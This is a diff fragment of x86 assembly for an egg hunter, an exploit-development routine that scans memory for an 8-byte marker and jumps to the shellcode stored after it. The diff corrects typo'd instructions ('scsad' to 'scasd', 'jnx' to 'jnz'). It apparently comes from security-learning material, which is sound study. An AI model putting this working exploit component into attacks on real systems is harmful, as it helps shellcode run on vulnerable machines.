@@ -16,8 +16,8 @@ next_addr:
     	jz next_page		; If Zeroflag is set jump to next page
     	mov eax, 0x77303077 	; FirstHalf of Egg => w00w(4 bytes) | Hex => 0x77303077 | CompleteEgg => w00ww00w(8 bytes) 
   	mov edi, ecx    	; move address from ecx to edi (the memory address to be compared with our EGG)
-    	scsad     		; if edi==eax the zero flag is set and edi is incremented by 4 bytes 
+    	scasd     		; if edi==eax the zero flag is set and edi is incremented by 4 bytes 
     	jnz next_addr    	; if zero flag is NOT set, jump to next_addr
-    	scsad    		; check for other half of EGG. if edi==eax the zero flag is set and edi is incremented by 4 bytes
-    	jnx next_addr    	; if zero flag is NOT set, jump to next_addr
+    	scasd    		; check for other half of EGG. if edi==eax the zero flag is set and edi is incremented by 4 bytes
+    	jnz next_addr    	; if zero flag is NOT set, jump to next_addr
     	jmp edi    		; jmp to our shellcode that is present right after the EGG.
